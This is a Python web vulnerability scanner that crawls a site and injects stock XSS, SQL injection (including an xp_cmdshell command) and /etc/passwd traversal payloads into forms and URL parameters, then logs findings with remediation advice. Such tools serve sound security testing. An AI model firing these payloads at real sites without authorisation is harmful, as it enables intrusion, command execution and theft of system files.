import requests
import re
import urllib.parse
import datetime
import json
import argparse
from bs4 import BeautifulSoup
from termcolor import colored

#Static payloads that can be updated in the future
xss_payloads = ["<img src=x onerror=alert('test')>","<script>alert('XSS')</script>", "\"><svg/onload=alert('XSS')>",
                "'><script>alert(document.cookie)</script>"]
sql_payloads = ["' OR '1'='1'--", "' UNION SELECT NULL, version()--", "'; EXEC xp_cmdshell('whoami')--","';--", "' OR 'a'='a"]
traversal_payloads = ["../../../../../../etc/passwd", "../etc/passwd", "../../boot.ini", "%2E%2E%2F%2E%2E%2Fetc/passwd",
                      "..%252f..%252f..%252fetc%252fpasswd"]
# List of common field names for username, password, and submit button
possible_usernames = ["username", "user", "email", "login", "name"]
possible_passwords = ["password", "pass", "pwd"]
possible_submit_buttons = ["submit", "Login", "log in", "signin"]
remediation_suggestions = {
            "XSS": "Sanitize and encode user input. Use Content Security Policy (CSP) headers.",
            "SQL Injection": "Use parameterized queries or prepared statements. Avoid dynamic SQL.",
            "Directory Traversal": "Validate file paths. Use secure APIs for file handling and restrict access."
        }

class Scanner:
    def __init__(self,url,ignore_links):
        #Open a session to maintain progress, especially if we need to log in before reaching the URL.
        self.session=requests.Session()
        self.target_url=url
        self.target_links=[]
        self.links_to_ignore=ignore_links
        self.vulnerabilities = []




    def extract_links(self,url):
        #Get all possible links from an HTML page, possible links are found after the "href" tag.
        response = self.session.get(url)
        return re.findall('(?:href=")(.*?)"', str(response.content))

    def crawl(self,url=None):
        if url is None:
            url=self.target_url
        #print(f"[DEBUG] Starting crawl on {url}")
        href_links = self.extract_links(url)
        for link in href_links:
            #Link links using the actual URL (because the link after the href tag is not the full URL)
            link = urllib.parse.urljoin(url, link)
            if "#" in link:
                link = link.split("#")[0]
                # Debug: Show each link being processed
                #print(f"[DEBUG] Found link with #: {link}")
            # Filter out non-HTML assets
            if any(link.endswith(ext) for ext in [".ico", ".css", ".js", ".jpg", ".jpeg", ".png", ".gif", ".svg"]):
                #print(f"[DEBUG] Skipping non-HTML asset: {link}")
                continue
            if self.target_url in link and link not in self.target_links and link not in self.links_to_ignore:
                self.target_links.append(link)
                print(colored("Link Found: "+str(link),'cyan'))
                self.crawl(url)


    def extract_form(self,url):
        #Get the url for the current session
        response = self.session.get(url)
        return BeautifulSoup(response.content, 'html.parser').findAll("form")

    def submit_form(self,form,value,url):
        action = form.get("action")
        post_url = urllib.parse.urljoin(url, action)
        method=form.get("method")
        if method is not None:
            method = form.get("method").lower()
        post_data = {}
        inputs_list = form.findAll("input")
        for input in inputs_list:
            input_name = input.get("name")
            input_type = input.get("type")
            input_value = input.get("value")
            if input_type == "text":
                input_value = value
            post_data[input_name] = input_value
        if method=="post":
            return self.session.post(post_url, data=post_data)
        return self.session.get(post_url,params=post_data)


    def run_scanner(self ):
        for link in self.target_links:
            forms = self.extract_form(link)
            #To discover vulnerabilities in a form
            for form in forms:
                print(colored(f"[+] Testing form on {link}",'light_green'))
                if self.test_xss_in_form(form, link):
                    print(colored(f"[***] XSS vulnerability found on {link}"+"in the following form: ",'red'))
                    print(colored(form,'white'))
                    print(colored(f"[!] Suggested Remediation: {remediation_suggestions['XSS']}", 'yellow'))
                if self.test_sql_injection(link):
                    print(colored(f"[***] SQL Injection vulnerability found on {link}"+"in the following form: ",'red'))
                    print(colored(form,'white'))
                    print(colored(f"[!] Suggested Remediation: {remediation_suggestions['SQL Injection']}", 'yellow'))

                if self.test_directory_traversal(link):
                    print(colored(f"[***] Directory Traversal vulnerability found on {link}"+"in the following form: ",'red'))
                    print(colored(form,'white'))
                    print(colored(f"[!] Suggested Remediation: {remediation_suggestions['Directory Traversal']}", 'yellow'))

            # To discover vulnerabilities in a link
            if "=" in link:
                print(colored(f"[+] Testing link: {link}",'light_green'))
                if self.test_xss_in_link(link):
                    print(colored(f"[***] XSS vulnerability found on {link}",'red'))
                if self.test_sql_injection(link):
                    print(colored(f"[***] SQL Injection vulnerability found on {link}",'red'))
                if self.test_directory_traversal(link):
                    print(colored(f"[***] Directory Traversal vulnerability found on {link}",'red'))

    def test_xss_in_link(self, url):
        for payload in xss_payloads:
            test_url = re.sub(r'=[^&]*', '=' + payload, url)
            response = self.session.get(test_url)
            if payload in response.text:
                self.log_vulnerability("XSS", url, payload=payload)
                return True
        return False

    def test_xss_in_form(self, form, url):
        for payload in xss_payloads:
            response = self.submit_form(form, payload, url)
            if payload in response.text:
                self.log_vulnerability("XSS", url, form=form, payload=payload)
                return True
        return False

    def test_sql_injection(self, url):
        for payload in sql_payloads:
            test_url = re.sub(r'=[^&]*', '=' + payload, url)
            response = self.session.get(test_url)
            if self.is_sql_error(response.text):
                self.log_vulnerability("SQL Injection", url, payload=payload)
                return True
        return False


    #Static method because it does not rely on instance or class state.
    @staticmethod
    def is_sql_error(response_text):
        errors = ["You have an error in your SQL syntax", "Warning: mysql_", "Unclosed quotation mark", "syntax error",
                  "unexpected end of SQL command", "unrecognized token"]
        return any(error in response_text for error in errors)



    def log_vulnerability(self, vuln_type, url, form=None, payload=None):
        timestamp = datetime.datetime.now().isoformat()
        remediation = remediation_suggestions.get(vuln_type, "No specific remediation provided.")
        entry = {
            "timestamp": timestamp,
            "type": vuln_type,
            "url": url,
            "payload": payload,
            "form": str(form) if form else "N/A",
            "remediation":remediation
        }
        self.vulnerabilities.append(entry)

    def save_report(self, filename="report.json"):
        if not self.vulnerabilities :
            self.vulnerabilities = "[+] No Vulnerabilities Found!"
        with open(filename, 'w') as file:
            if self.vulnerabilities is None:
                self.vulnerabilities="[+] No Vulnerabilities Found!"
            json.dump(self.vulnerabilities, file, indent=4)
        print(colored(f"[+] Report saved to {filename}",'green'))

    def test_directory_traversal(self, url):
        if "=" in url:
            for payload in traversal_payloads:
                test_url = re.sub(r'=[^&]*', '=' + payload, url)
                print(colored(test_url,'cyan'))
                response = self.session.get(test_url)
                if self.is_traversal_success(response.text):
                    self.log_vulnerability("Directory Traversal", url, payload=payload)
                    return True
        return False

    @staticmethod
    def is_traversal_success(response_text):
        traversal_indicators = ["root:", "[boot loader]", "sbin/nologin"]
        return any(indicator in response_text for indicator in traversal_indicators)


    def try_login(self,login_url,username,password):
        for user_field in possible_usernames:
            for pass_field in possible_passwords:
                for submit_button in possible_submit_buttons:
                    # Create a data dictionary with current fields
                    data_dict = {user_field: username, pass_field: password, submit_button: "1"}

                    try:
                        # Attempt to log in
                        login_response = self.session.post(login_url, data=data_dict)

                        # Check for login success or failure based on page content
                        if "Login" in login_response.text or "incorrect" in login_response.text:
                            print(colored(f"[-] Login failed with fields {user_field}, {pass_field}, {submit_button}",
                                          'light_red'))

                        else:
                            print(
                                colored(f"[+] Login successful with fields {user_field}, {pass_field}, {submit_button}",
                                        'green'))
                            return True  # Exit function if login is successful
                    except Exception as e:
                        print(
                            colored(
                                f"[-] Error trying login with fields {user_field}, {pass_field}, {submit_button}: {e}",
                                'yellow'))

        # If all attempts failed
        print(colored("[-] All login attempts failed. Please check your credentials and field names.", 'light_red',attrs=['blink']))
        return False

def get_arguments():
    parser = argparse.ArgumentParser(description="Vulnerability scanner")
    parser.add_argument("-u", "--urls", required=True, help="Target URLs to scan, separated by commas")
    parser.add_argument("-i", "--ignore", help="Links to ignore, separated by commas")
    parser.add_argument("-l", "--login_url", help="Login URL if authentication is required")
    parser.add_argument("-n", "--username", help="Username for login")
    parser.add_argument("-p", "--password", help="Password for login")
    return parser.parse_args()

def get_seed_urls(options):
    # Split the target URLs by comma to handle multiple URLs or a single URL
    urls = options.urls.split(",")
    return [url.strip() for url in urls]  # Remove any leading/trailing whitespace


def main():
    options= get_arguments()
    target_url=options.urls
    links_to_ignore = options.ignore.split(",") if options.ignore else []
    seed_urls = get_seed_urls(options)
    login_url = options.login_url
    username = options.username
    password = options.password
    vul_scanner=Scanner(target_url,links_to_ignore)
    if login_url:
        vul_scanner.try_login(login_url,username,password)
    for url in seed_urls:
        #print(f"[DEBUG] Starting scan on: {url}")
        vul_scanner.target_url = url
        vul_scanner.target_links = [url]  # Reset target links for each new URL
        vul_scanner.crawl()
        vul_scanner.run_scanner()

    # Save report after all URLs are scanned
    vul_scanner.save_report()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(colored("\n[!] Ctrl+C detected, stopping the scan...",'yellow',attrs=['blink']))
    except Exception as e:
        print(colored("[-] "+str(e),'red', attrs=['bold']))

